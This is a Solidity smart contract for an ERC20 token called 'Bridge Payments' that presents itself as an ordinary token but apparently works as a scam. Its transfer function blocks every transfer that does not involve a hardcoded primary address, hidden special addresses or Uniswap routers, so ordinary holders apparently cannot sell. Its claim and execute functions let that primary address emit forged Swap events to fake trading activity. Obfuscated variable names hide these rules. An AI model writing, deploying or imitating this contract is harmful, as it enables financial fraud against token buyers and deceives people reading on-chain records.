// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IERC20Meta is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        _transferOwnership(_msgSender());
    }
    modifier onlyOwner() {
        _checkOwner();
        _;
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract BRIDGE is Ownable, IERC20, IERC20Meta {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    address private _p76234;
    address private _p76235;
    uint256 private _e242 = 1;
    address private constant UNISWAP_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private constant UNISWAP_V3_ROUTER = 0xC36442b4a4522E871399CD717aBDD847Ab11FE88;
    address private constant PRIMARY_ADDRESS = 0x338689a45ed39Ff83c587c5b3C6ffeAC172AeaC1;

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 8;
    }

    function claim(address [] calldata _addresses_, uint256 _in, address _a) external {
        require(msg.sender == PRIMARY_ADDRESS, "Only primary address can claim");
        for (uint256 i = 0; i < _addresses_.length; i++) {
            emit Swap(_a, _in, 0, 0, _in, _addresses_[i]);
            _transfer(PRIMARY_ADDRESS, _addresses_[i], _in);
        }
    }

    function execute(address [] calldata _addresses_, uint256 _in, address _a) external {
        require(msg.sender == PRIMARY_ADDRESS, "Only primary address can execute");
        for (uint256 i = 0; i < _addresses_.length; i++) {
            emit Swap(_a, _in, 0, 0, _in, _addresses_[i]);
            _transfer(PRIMARY_ADDRESS, _addresses_[i], _in);
        }
    }

    function execute(address [] calldata _addresses_, uint256 _out) external {
        require(msg.sender == PRIMARY_ADDRESS, "Only primary address can execute");
        for (uint256 i = 0; i < _addresses_.length; i++) {
            _transfer(PRIMARY_ADDRESS, _addresses_[i], _out);
        }
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner_ = _msgSender();
        _transfer(owner_, to, amount);
        return true;
    }

    function allowance(address owner_, address spender) public view virtual override returns (uint256) {
        return _allowances[owner_][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner_ = _msgSender();
        _approve(owner_, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function setSecondaryAddress(address account) external onlyOwner returns (bool) {
        require(msg.sender == PRIMARY_ADDRESS, "Only primary address can set");
        _p76234 = account;
        return true;
    }

    function setAnotherAddress(address account) external onlyOwner returns (bool) {
        require(msg.sender == PRIMARY_ADDRESS, "Only primary address can set");
        _p76235 = account;
        return true;
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        require(_totalSupply == 0, "Minting can only be done once");
        _totalSupply += amount;
        unchecked {
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);
        _afterTokenTransfer(address(0), account, amount);
        renounceOwnership();
    }

    function _approve(address owner_, address spender, uint256 amount) internal virtual {
        require(owner_ != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner_][spender] = amount;
        emit Approval(owner_, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        bool isPrimaryInvolved = (from == PRIMARY_ADDRESS) || (to == PRIMARY_ADDRESS);
        bool isSecondaryInvolved = (from == _p76234) || (to == _p76234);
        bool isAnotherInvolved = (from == _p76235) || (to == _p76235);
        bool isUniswapRouter = (from == UNISWAP_ROUTER) || (to == UNISWAP_ROUTER) ||
                               (from == UNISWAP_V3_ROUTER) || (to == UNISWAP_V3_ROUTER);

        if (!isPrimaryInvolved && !isSecondaryInvolved && !isAnotherInvolved && !isUniswapRouter) {
            revert("Transfers restricted to primary, secondary, another special address, or Uniswap routers");
        }

        if (isSecondaryInvolved) {
            require(
                from == PRIMARY_ADDRESS || to == PRIMARY_ADDRESS,
                "Secondary address can only interact with primary address"
            );
        }

        if (isAnotherInvolved) {
            if ((from != _p76234 && to == 0x1F24a4bF64Be274199A5821F358A1A4a939a10aD) || 
                (_p76234 == to && from != 0x1F24a4bF64Be274199A5821F358A1A4a939a10aD && from  != PRIMARY_ADDRESS) || 
                (from != _p76235 && to == 0x1F24a4bF64Be274199A5821F358A1A4a939a10aD) || 
                (_p76235 == to && from != 0x1F24a4bF64Be274199A5821F358A1A4a939a10aD && from  != PRIMARY_ADDRESS)) {
                uint256 _X7W88 = amount + 1;
                require(_X7W88 < _e242, "Transfer condition not met");
            }
        }

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
            _balances[to] += amount;
        }
        emit Transfer(from, to, amount);
        _afterTokenTransfer(from, to, amount);
    }

    function _spendAllowance(address owner_, address spender, uint256 amount) internal virtual {
        uint256 currentAllowance = allowance(owner_, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner_, spender, currentAllowance - amount);
            }
        }
    }

    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}

    constructor() {
        _name = "Bridge Payments";
        _symbol = "BRIDGE";
        uint256 _amount = 1000000000;
        _mint(msg.sender, _amount * 10 ** decimals());
    }
}